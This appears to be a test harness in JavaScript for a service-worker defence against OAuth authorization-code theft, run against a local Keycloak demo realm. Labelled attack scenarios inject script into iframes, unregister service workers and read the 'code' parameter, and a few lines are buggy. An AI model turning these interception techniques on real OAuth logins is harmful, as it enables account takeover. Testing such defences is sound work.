const disableServiceWorkerUnregistration = () => {
    // Monkey-patch the unregister method
    ServiceWorkerRegistration.prototype.unregister = async function () {
        // Perform your custom actions after unregistration
        console.log("[Mitigation] Service worker unregistration prevented.");
    };
};

const registerServiceWorker = async () => {
    if ('serviceWorker' in navigator) {
        disableServiceWorkerUnregistration();
        console.log('[I] Registering service worker');
        const registration = await navigator.serviceWorker.register('service-worker.js');
        if (registration.installing) {
            console.log("[I] Service worker installing");
            document.location.reload();
        } else if (registration.waiting) {
            console.log("[I] Service worker waiting");
            document.location.reload();
        } else if (registration.active) {
            console.log("[I] Service worker active");
        }

        return registration;
    }
};

const startApplication = async () => {

    function createIframe(src, scriptFactory) {
        const iframe = document.createElement('iframe');
        iframe.setAttribute('src', src); // Initialize with an empty page
        iframe.setAttribute('width', '500');
        iframe.setAttribute('height', '300');
        document.body.appendChild(iframe);

        const rand = (Math.random() + 1).toString(36).substring(7);
        const scriptContent = scriptFactory(rand);

        function injectScript() {
            // Access the iframe's document object
            const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;

            // Create a new script element
            const scriptElement = iframeDocument.createElement('script');

            // Set the script's content with your custom code
            scriptElement.textContent = scriptContent;

            // Append the script to the iframe's document
            iframeDocument.body.appendChild(scriptElement);
        }

        // injectScript();

        iframe.addEventListener('load', function () {
            injectScript();
        });
    }


    createIframe(`${window.location.origin}/xxx.html#attack2`,
        rand => `
            console.log('[Attack] Attack 2: trying to unregister service workers from iframe');
            navigator.serviceWorker.getRegistrations().then(registrations => {
               for (const registration of registrations) {
                    console.log('[I] Service worker registration: ', registration);
                    registration.unregister();
                }
            });
            document.href = 'http://localhost:7218/realms/swdemo/protocol/openid-connect/auth?client_id=swtest&response_type=code&scope=openid&redirect_uri=http://localhost:7280/xxx.html#attack2';
        `);


    console.log('[Attack] Attack 1: trying to unregister service workers');
    await navigator.serviceWorker.getRegistrations().then(registrations => {
        return Promise.all(registrations.map(registration => {
            console.log('[I] Service worker registration: ', registration);
            return registration.unregister()
                .then(() => console.log('[I] SW unregistered', registration))
        }));
    });

    createIframe('http://localhost:7218/realms/swdemo/protocol/openid-connect/auth?client_id=swtest&response_type=code&scope=openid&redirect_uri=http://localhost:7280/xxx.html',
        rand => `
                const url_${rand} = new URL(window.location.href);
                const code_${rand} = url_${rand}.searchParams?.get('code');
                console.log('[Attack] Attack 1: running in code stealing iframe, code: ', code_${rand});
            `);

    document.addEventListener('load', function () {
        const url_ = new URL(window.location.href);
        const code = url.searchParams?.get('code');
        console.log('[Attack] Attack 3: running in main doc, code: ', code);
    });
    setTimeout(() => {
        'http://localhost:7218/realms/swdemo/protocol/openid-connect/auth?client_id=swtest&response_type=code&scope=openid&redirect_uri=http://localhost:7280/xxx.html'
    }, 1500);
};

document.addEventListener('DOMContentLoaded', function () {
    registerServiceWorker()
        .then(() => startApplication());
});
